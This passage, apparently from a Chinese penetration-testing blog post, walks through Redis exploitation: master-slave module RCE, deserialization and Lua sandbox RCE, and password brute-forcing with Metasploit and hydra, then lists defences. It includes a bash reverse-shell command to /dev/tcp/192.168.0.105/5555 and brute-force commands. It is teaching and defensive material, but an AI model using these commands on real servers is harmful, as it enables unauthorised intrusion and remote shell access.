+</span></span><span class="line"><span class="cl">python redis-rce.py -r &lt;目标地址&gt;  -L &lt;本机地址&gt; -f module.so
+</span></span><span class="line"><span class="cl"><span class="c1"># 执行成功后可以选择生成一个交互的shell，或者重新反弹一个shell</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h6 id="2反序列化rce">2.反序列化rce</h6>
+<p>当遇到 redis 服务器写文件无法 getshell，可以查看redis数据是否符合序列化数据的特征。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">jackson：关注 json 对象是不是数组，第一个元素看起来像不像类名，例如[&#34;com.blue.bean.User&#34;,xxx]
+</span></span><span class="line"><span class="cl">fastjson：关注有没有 @type 字段
+</span></span><span class="line"><span class="cl">jdk：首先看 value 是不是 base64，如果是解码后看里面有没有 java 包名
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a href="https://mp.weixin.qq.com/s/ungjainqdPhA_dDOOMKn4Q"target="_blank" rel="external nofollow noopener noreferrer">https://mp.weixin.qq.com/s/ungjainqdPhA_dDOOMKn4Q<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+<h6 id="3lua-rce">3.lua rce</h6>
+<blockquote>
+<p>适用于高权限运行低版本redis的lua虚拟机，写文件失败时进行尝试</p>
+</blockquote>
+<p>使用<code>info server</code> 和 <code>eval “return _VERSION” 0 </code>命令可以查看当前redis版本和编译信息。</p>
+<p>exp</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://github.com/QAX-A-Team/redis_lua_exploit/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>修改<code>redis_lua.py</code>中目标地址为靶机的地址和端口</p>
+<img src="http://image.xpshuai.cn/20200526092701919_308935847.png"/>
+<p>运行exp</p>
+<p>执行成功后就可以进行命令执行了，这里反弹shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">eval</span> <span class="s2">&#34;tonumber(&#39;/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.105/5555 0&gt;&amp;1&#39;, 8)&#34;</span> <span class="m">0</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="三redis密码爆破">三、redis密码爆破</h4>
+<p>1.使用redis-cli连接，使用-a参数指定密码操作。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">redir-cli -h 192.168.0.100 -a admin123
+</span></span><span class="line"><span class="cl"><span class="c1"># 这个好像没这么实用感觉，也许可以写成脚本批量跑</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>2.msf的<code>auxiliary/scanner/redis/redis_login</code>模块</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">use auxiliary/scanner/redis/redis_login
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> rhost ...
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> threads ...
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> pass_file xxxxxxx.txt
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="http://image.xpshuai.cn/20200526094633220_1454687311.png"/>
+<p>3.hydra</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 还是hydra好用，速度还快</span>
+</span></span><span class="line"><span class="cl">hydra -P redis_pass.txt redis://192.168.0.100
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="http://image.xpshuai.cn/20200526095113424_1824777352.png"/>
+<h2 id="防御手段">防御手段</h2>
+<ul>
+<li>禁止root运行redis</li>
+<li>设置账户密码认证</li>
+<li>服务部署使用单独低权限账户</li>
+<li>添加IP访问限制(bind),并更更改默认6379端口</li>
+<li>redis在默认情况下，是不会生成日志文件的，所以需要修改配置文件，让redis生成日志，以及设置日志等级</li>
+<li>保证 authorized_keys 文件的安全（<code>chmod 400 ~/.ssh/authorized_keys</code>）</li>
+<li>设置防火墙策略　</li>
+</ul>
+<p><strong>参考链接</strong>
+<a href="https://mp.weixin.qq.com/s/ungjainqdPhA_dDOOMKn4Q"target="_blank" rel="external nofollow noopener noreferrer">https://mp.weixin.qq.com/s/ungjainqdPhA_dDOOMKn4Q<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>
+<a href="https://www.freebuf.com/column/158065.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.freebuf.com/column/158065.html<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title=2023-01-21&#32;16:47:23>更新于 2023-01-21&nbsp;</span>
+      </div><div class="post-info-license">
+          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+        </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"><span><a href="/redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span><span><a href="https://github.com/shuai06/edit/main/content/posts/redis%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8.md" title="编辑此页"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">编辑此页</a></span></div>
+      <div class="post-info-share">
+        <span></span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/' class="post-tag">渗透测试</a><a href='/tags/redis/' class="post-tag">redis</a><a href='/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/' class="post-tag">未授权访问</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/jupyter-notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/" class="post-nav-item" rel="prev" title="Jupyter Notebook 未授权访问漏洞简单复现"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Jupyter Notebook 未授权访问漏洞简单复现</a>
+      <a href="/hadoop%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="post-nav-item" rel="next" title="Hadoop未授权访问漏洞">Hadoop未授权访问漏洞<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="giscus">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="hugo-fixit/FixIt"
+            data-repo-id="R_kgDOGihPtQ"
+            data-category="General"
+            data-category-id="DIC_kwDOGihPtc4CApHX"
+            data-mapping="title"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="bottom"
+            data-lang="zh-CN"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+        </div>
+        <noscript>
+          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+        </noscript></div></article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.109.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.2.17-RC"><img class="fixit-icon" src="/fixit.min.svg" alt="FixIt logo" />&nbsp;FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">
+              <a href="http://geoer.cn"target="_blank" rel="external nofollow noopener noreferrer">剑胆琴心</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;--bg-progress: #000;--bg-progress-dark: #fff;"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/algoliasearch/algoliasearch-lite.umd.min.js" defer></script><script src="/lib/lazysizes/lazysizes.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":true,"expired":false,"giscus":{"darkTheme":"dark_dimmed","lightTheme":"light"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"enablePWA":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"pangu":{"enable":true,"selector":"article"},"search":{"algoliaAppID":"YKOM6PKLUY","algoliaIndex":"index.zh-cn","algoliaSearchKey":"a44c110d3ac360be2c69cd79d34b77a8","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"watermark":{"content":"\u003cimg class=\"fixit-icon\" src=\"/images/avatar.png\" alt=\"FixIt logo\" /\u003e 剑胆琴心","enable":true,"height":21,"opacity":0.0125}};</script><script src="/js/theme.min.js" defer></script><script src="/js/custom.min.js" defer></script></body>
+</html>
